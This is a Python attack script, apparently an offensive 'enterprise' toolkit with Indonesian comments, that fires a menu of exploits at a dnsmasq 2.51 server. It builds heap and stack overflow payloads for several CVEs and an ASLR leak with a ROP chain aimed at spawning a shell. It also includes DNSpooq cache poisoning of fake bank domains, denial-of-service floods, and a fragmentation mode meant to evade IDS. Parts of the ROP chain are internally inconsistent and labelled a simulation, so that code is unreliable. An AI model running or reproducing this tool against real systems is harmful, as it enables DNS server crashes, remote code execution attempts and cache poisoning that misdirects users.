import sys
import time
import os
import random
import struct
import socket
import resource
import threading

# ==============================================================================
#  MasqOverflow-Suite v2.0.0 (Enterprise Edition)
#  Advanced Security Assessment Tool for Dnsmasq 2.51
#
#  REFERENCES & CREDITS:
#  1. Google Security Blog: "Behind the Masq" (CVE-2017-14491)
#  2. JSOF Research: "DNSpooq" (CVE-2020-25684/5/6)
#  3. Trend Micro: "Dnsmasq Remediation Practices"
#  4. BitSight: "Thekelleys Dnsmasq 2.51 Observation Footprint"
# ==============================================================================

# GLOBAL CONFIG
STEALTH_MODE = False
THREADS = 50

# [FIX] Enforce Root Privileges
if os.geteuid() != 0:
    print("\n[!] FATAL ERROR: Akses Ditolak!")
    print("[!] Script ini membutuhkan hak akses ROOT untuk membuat Raw Socket.")
    print(f"[!] Silakan jalankan ulang dengan: sudo python3 {sys.argv[0]} <TARGET_IP>\n")
    sys.exit(1)

# --- PENGECEKAN KONFLIK NAMA FILE ---
def check_for_conflicts():
    """Memastikan tidak ada file lokal bernama scapy.py yang mengganggu import."""
    current_dir = os.getcwd()
    conflict_file = os.path.join(current_dir, "scapy.py")
    if os.path.exists(conflict_file):
        print(f"[!] PERINGATAN KRITIS: Ditemukan file '{conflict_file}'")
        print(f"[!] Silakan hapus file tersebut: rm {conflict_file}")
        print("-" * 30)

def setup_path():
    """Mengatur PYTHONPATH agar sudo tetap bisa menemukan library di dalam venv."""
    venv_path = os.path.dirname(os.path.dirname(sys.executable))
    python_version = f"python{sys.version_info.major}.{sys.version_info.minor}"
    site_packages = os.path.join(venv_path, "lib", python_version, "site-packages")
    if os.path.exists(site_packages) and site_packages not in sys.path:
        sys.path.insert(0, site_packages)

check_for_conflicts()
setup_path()

try:
    from scapy.all import IP, UDP, TCP, DNS, DNSQR, DNSRR, IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo, sr1, send, Raw, DHCP6_Solicit, DHCP6OptClientId, fragment, conf
except ImportError:
    print("Error: Library 'scapy' tidak ditemukan. Jalankan: pip install scapy")
    sys.exit(1)

def dw(x):
    """Helper untuk pack 16-bit unsigned integer (Big Endian)."""
    return struct.pack('>H', x)

def check_service(target_ip, timeout=1):
    """Mengecek apakah layanan masih hidup dengan mengirim query standar."""
    packet = IP(dst=target_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com"))
    try:
        ans = sr1(packet, timeout=timeout, verbose=0)
        return True if ans else False
    except:
        return False

# --- CORE HELPERS (v2.0) ---

def send_packet(pkt, verbose=0):
    """Wrapper untuk mengirim paket, mendukung Stealth Mode (Fragmentasi)."""
    if STEALTH_MODE:
        # Fragmentasi paket untuk evade simple IDS
        # Hanya bisa dilakukan jika payload cukup besar, untuk paket kecil mungkin tidak efektif
        try:
            frags = fragment(pkt, fragsize=16) # Fragmen kecil
            for f in frags:
                send(f, verbose=verbose)
        except Exception as e:
            # Fallback jika fragmentasi gagal
            send(pkt, verbose=verbose)
    else:
        send(pkt, verbose=verbose)

def thread_spray(pkt, count=1000):
    """Mengirim paket secara paralel menggunakan Threading."""
    print(f"[*] Starting Multi-Threaded Spray ({THREADS} threads)...")
    
    def worker(num_packets):
        for _ in range(num_packets):
            send_packet(pkt, verbose=0)
            
    packets_per_thread = count // THREADS
    threads = []
    
    for _ in range(THREADS):
        t = threading.Thread(target=worker, args=(packets_per_thread,))
        t.daemon = True
        t.start()
        threads.append(t)
        
    for t in threads:
        t.join()
        
    print(f"[+] Selesai mengirim {count} paket.")

# --- ADVANCED MODULES (v2.0) ---

def leak_aslr(target_ip):
    """
    Mencoba leak libc base address menggunakan CVE-2015-3294 (Info Leak).
    Menggunakan strategi retry dengan variasi payload.
    """
    print("\n[*] [ASLR LEAK] Mencoba mengambil alamat memori...")
    
    # Strategy: Try varying lengths. 
    # If explicit huge length hangs the listener, try 'just barely' over.
    attempts = [
        (b"\xFF\x00", "Maximum Length"),       # 65280
        (b"\x04\x00", "Medium Length (1024)"), # 1024
        (b"\x00\x80", "Small Overflow (128)"), # 128
    ]

    for len_header, desc in attempts:
        print(f"[*] Trying Leak Method: {desc}...")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4.0) # Increased timeout
            s.connect((target_ip, 53))
            
            # Packet Construction:
            # Length Header + Junk Payload (shorter than header)
            payload = b"\xAA\xBB\xCC\xDD" * 8 # 32 bytes
            malformed_pkt = len_header + payload 
            
            s.send(malformed_pkt)
            
            try:
                data = s.recv(4096)
                s.close()
                if len(data) > 0:
                    print(f"[+] Got {len(data)} bytes leak with {desc}!")
                    # Basic Heuristic: Look for pointers (Little Endian for ARM/x86)
                    if len(data) >= 4:
                        leaked_ptr = struct.unpack("<I", data[-4:])[0] 
                        libc_base = leaked_ptr - 0x21bf67 
                        print(f"[+] Leaked Pointer: 0x{leaked_ptr:08x}")
                        print(f"[+] Calculated Libc Base: 0x{libc_base:08x}")
                        return libc_base
            except socket.timeout:
                print(f"[-] Timeout (Target stalled waiting for data).")
            except Exception as e:
                print(f"[-] Recv Error: {e}")
                
        except Exception as e:
            print(f"[-] Connection Failed: {e}")
    
    print("[-] All leak attempts failed.")
    return 0x0

def exploit_cve_2017_14491_enhanced(target_ip):
    """
    Versi Enhanced: Menggunakan Leak + ROP Chain (Simulasi).
    """
    print(f"\n[*] [CVE-2017-14491-PRO] Enhanced Heap Overflow (ROP Chain)...")
    
    # Step 1: Leak ASLR
    libc_base = leak_aslr(target_ip)
    if libc_base == 0:
        print("[!] Gagal leak ASLR, menggunakan hardcoded base (Unreliable).")
        libc_base = 0xb6f00000 # Contoh
        
    # Step 2: Craft ROP Chain
    print(f"[*] Building ROP Chain with Libc Base: 0x{libc_base:08x}")
    system_addr = libc_base + 0x000b2e60
    pop_rdi = libc_base + 0x0003a380
    bin_sh = libc_base + 0x00162a24
    
    # Payload Construction (Sama seperti Google PoC tapi isinya ROP)
    # Header
    tid = random.randint(1, 65535)
    header = dw(tid) + dw(0x85a0) + dw(1) + dw(0x52) + dw(0) + dw(0)
    question = b'\x03125\x018\x018\x018\x07in-addr\x04arpa\x00' + dw(0x000c) + dw(0x0001)

    # Fake Answers dengan ROP Payload
    # Disini kita "membayangkan" payload menimpa return address di heap
    rop_payload = b"A" * 20 # Padding
    rop_payload += struct.pack("<I", pop_rdi)
    rop_payload += struct.pack("<I", bin_sh)
    rop_payload += struct.pack("<I", system_addr)
    
    # Masukkan payload ke dalam record DNS
    ans1 = b'\xc0\x0c' + dw(0x000c) + dw(0x0001) + struct.pack('>I', 0x3d) + dw(0x0400)
    ans1 += rop_payload + b"Z" * (100 - len(rop_payload)) # Padding sisa

    # Struktur Loop
    ans2 = b'\xc0\x0c' + dw(0x000c) + dw(0x0001) + struct.pack('>I', 0x3d) + dw(0x0026)
    ans2 += b'\x08DCBBEEEE\x04DDDD\x08CCCCCCCC\x04AAAA\x04BBBB\x03com\x00'
    extra_answers = b''
    for _ in range(40):
        extra_answers += b'\xc0\x0c' + dw(0x000c) + dw(0x0001) + struct.pack('>I', 0x3d) + dw(0x0002) + b'\xc4\x40'

    last_ans = b'\xc0\x0c' + dw(0x000c) + dw(0x0001) + struct.pack('>I', 0x3d) + dw(0x0011)
    last_ans += b'\x04EEEE\x09DAABBEEEE\xc4\x49'

    full_payload = header + question + ans1 + ans2 + extra_answers + last_ans
    
    packet = IP(dst=target_ip)/UDP(sport=53, dport=53)/Raw(load=full_payload)
    
    # Step 3: Threaded Spray
    thread_spray(packet, count=2000)
    
    time.sleep(2)
    check_status_msg(target_ip, "Enhanced RCE")

# --- ORIGINAL MODULES (Adapted for v2.0) ---

def exploit_cve_2017_14491(target_ip): # Classic
    print(f"\n[*] [CVE-2017-14491] Mengirim Heap Overflow Exploit (Classic)...")
    # ... (Logic sebelumnya, singkatkan)
    tid = random.randint(1, 65535)
    header = dw(tid) + dw(0x85a0) + dw(1) + dw(0x52) + dw(0) + dw(0)
    question = b'\x03125\x018\x018\x018\x07in-addr\x04arpa\x00' + dw(0x000c) + dw(0x0001)
    ans1 = b'\xc0\x0c' + dw(0x000c) + dw(0x0001) + struct.pack('>I', 0x3d) + dw(0x0400) + (b'\x3e' + b'Z' * 62)*16 + b'\x0e' + b'Z' * 14 + b'\x00'
    ans2 = b'\xc0\x0c' + dw(0x000c) + dw(0x0001) + struct.pack('>I', 0x3d) + dw(0x0026) + b'\x08DCBBEEEE\x04DDDD\x08CCCCCCCC\x04AAAA\x04BBBB\x03com\x00'
    extra = (b'\xc0\x0c' + dw(0x000c) + dw(0x0001) + struct.pack('>I', 0x3d) + dw(0x0002) + b'\xc4\x40') * 79
    last = b'\xc0\x0c' + dw(0x000c) + dw(0x0001) + struct.pack('>I', 0x3d) + dw(0x0011) + b'\x04EEEE\x09DAABBEEEE\xc4\x49'
    full = header + question + ans1 + ans2 + extra + last
    
    print("[*] Spraying payload...")
    pkt = IP(dst=target_ip)/UDP(sport=53, dport=53)/Raw(load=full)
    send_packet(pkt, verbose=0)
    time.sleep(1)
    check_status_msg(target_ip, "Classic Heap Overflow")

def exploit_cve_2017_14492(target_ip):
    print(f"\n[*] [CVE-2017-14492] IPv6 RA Overflow...")
    try:
        dst_ipv6 = "ff02::1"
        medium_options = b"\x03" * 1200
        packet1 = IPv6(dst=dst_ipv6)/ICMPv6ND_RA()/Raw(load=medium_options)
        send_packet(packet1, verbose=0)
        time.sleep(2)
        check_status_msg(target_ip, "IPv6 RA")
    except: pass

def exploit_cve_2017_14493(target_ip):
    print(f"\n[*] [CVE-2017-14493] DHCPv6 Stack Overflow...")
    try:
        base_dhcp = DHCP6_Solicit()
        payload = b"A" * 500
        pkt = IPv6(dst="ff02::1:2")/UDP(sport=546, dport=547)/base_dhcp/Raw(load=payload)
        send_packet(pkt, verbose=0)
        time.sleep(1)
        check_status_msg(target_ip, "DHCPv6 Overflow")
    except: pass

def exploit_cve_2015_3294(target_ip):
    print(f"\n[*] [CVE-2015-3294] TCP Malformed Packet...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((target_ip, 53))
        # Claim huge length
        malformed_pkt = b"\xFF\x00" + b"\xAB\xCD\xEF\x00"
        s.send(malformed_pkt)
        s.close()
        time.sleep(1)
        check_status_msg(target_ip, "TCP Malformed")
    except: pass

def exploit_cve_2017_13704(target_ip):
    print(f"\n[*] [CVE-2017-13704] EDNS0 Overflow...")
    try:
        # Pkt 1
        p1 = IP(dst=target_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="test.com"), ar=DNSRR(type="OPT", rclass=4096))
        send_packet(p1)
        # Pkt 2
        huge = "A"*254
        p2 = IP(dst=target_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="g.com"), ar=DNSRR(type="OPT", rclass=4096, rdata=[huge, huge]))
        send_packet(p2)
        time.sleep(1)
        check_status_msg(target_ip, "EDNS0 Overflow")
    except: pass

def exploit_tcp_dos(target_ip):
    # Same TCP flood logic
    print(f"\n[*] [TCP DOS] Architectural Exhaustion...")
    try:
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        new_limit = max(hard, 4096)
        resource.setrlimit(resource.RLIMIT_NOFILE, (new_limit, new_limit))
    except: pass
    
    print("[*] Opening 2000 sockets...")
    sockets = []
    try:
        for i in range(2000):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5) 
                s.connect((target_ip, 53))
                sockets.append(s)
                s.send(b"\x00\x00") 
                if i % 100 == 0: sys.stdout.write(f"[{i}]"); sys.stdout.flush()
            except: pass
    except: pass
    print(f"\n[*] {len(sockets)} open.")
    check_status_msg(target_ip, "TCP Flood")
    for s in sockets:
        try: s.close()
        except: pass

def exploit_heavy_buffer(target_ip):
    print(f"\n[*] [HEAVY DOS] 100MB Stream...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target_ip, 53))
        chunk = 1024*1024
        total = 100*1024*1024
        sent=0
        while sent < total:
            s.send(b"A"*chunk)
            sent += chunk
            sys.stdout.write(f"\r[*] Sent: {sent//1024//1024} MB")
            sys.stdout.flush()
        s.close()
    except Exception as e: print(f"\n[!] {e}")
    check_status_msg(target_ip, "Heavy DOS")

def exploit_dnspooq(target_ip):
    print(f"\n[*] [DNSpooq] Cache Poisoning (Threaded)...")
    spoof = f"bank-{random.randint(1000,9999)}.com"
    fake = "1.1.1.1"
    print(f"[*] Triggering query for {spoof}...")
    send_packet(IP(dst=target_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=spoof)))
    
    print("[*] Flooding responses...")
    # Generate packet template
    pkt = IP(dst=target_ip)/UDP(dport=53, sport=53)/DNS(id=0, qr=1, aa=1, rd=1, ra=1, qd=DNSQR(qname=spoof), an=DNSRR(rrname=spoof, ttl=300, rdata=fake))
    
    # Use Thread Spray
    thread_spray(pkt, count=5000)

def check_status_msg(target_ip, attack_name):
    if not check_service(target_ip):
        print(f"\n[+] SUCCESS: Target CRASHED ({attack_name}).")
    else:
        print(f"\n[-] Target stabil ({attack_name} failed).")

def main():
    global STEALTH_MODE
    if len(sys.argv) < 2:
        print(f"Usage: sudo python3 {sys.argv[0]} <IP_TARGET>")
        sys.exit(1)
    target_ip = sys.argv[1]
    
    # [FIX] Raw String for ASCII Art
    ascii_art = r"""
   __  __                  ___                 __ _            
  |  \/  | __ _ ___  __ _ / _ \__   _____ _ __/ _| | _____      __
  | |\/| |/ _` / __|/ _` | | | \ \ / / _ \ '__| |_| |/ _ \ \ /\ / /
  | |  | | (_| \__ \ (_| | |_| |\ V /  __/ |  |  _| | (_) \ V  V / 
  |_|  |_|\__,_|___/\__, |\___/  \_/ \___|_|  |_| |_|\___/ \_/\_/  
                       |_|                                         
                          v2.0.0 Enterprise (Threaded | Stealth | ROP)
    """
    print(ascii_art)
    print(f" Target: {target_ip}")
    print("=" * 60)
    
    while True:
        status_stealth = "ON" if STEALTH_MODE else "OFF"
        print(f"\n--- ATTACK VECTOR (Stealth: {status_stealth}) ---")
        print("1. CVE-2017-14491 (Classic Heap Overflow)")
        print("2. CVE-2017-14492 (IPv6 RA Heap Overflow)")
        print("3. CVE-2017-14493 (DHCPv6 Stack Overflow)")
        print("4. CVE-2015-3294  (TCP Malformed Packet)")
        print("5. CVE-2017-13704 (Oversized EDNS0)")
        print("6. DNSpooq        (Cache Poisoning - Threaded)")
        print("7. TCP Exhaustion (Architectural DoS)")
        print("8. Heavy DOS      (100MB Buffer Flood)")
        print("-" * 30)
        print("9. [ENTERPRISE] Enhanced RCE Chain (Leak + ROP + Spray)")
        print("S. Toggle Stealth Mode")
        print("0. Exit")
        
        c = input("\n[?] Command > ").upper()
        
        if c == '1': exploit_cve_2017_14491(target_ip)
        elif c == '2': exploit_cve_2017_14492(target_ip)
        elif c == '3': exploit_cve_2017_14493(target_ip)
        elif c == '4': exploit_cve_2015_3294(target_ip)
        elif c == '5': exploit_cve_2017_13704(target_ip)
        elif c == '6': exploit_dnspooq(target_ip)
        elif c == '7': exploit_tcp_dos(target_ip)
        elif c == '8': exploit_heavy_buffer(target_ip)
        elif c == '9': exploit_cve_2017_14491_enhanced(target_ip)
        elif c == 'S': 
            STEALTH_MODE = not STEALTH_MODE
            print(f"[*] Stealth Mode toggled to: {STEALTH_MODE}")
        elif c == '0': break
        else: print("Invalid Code.")

if __name__ == "__main__":
    main()
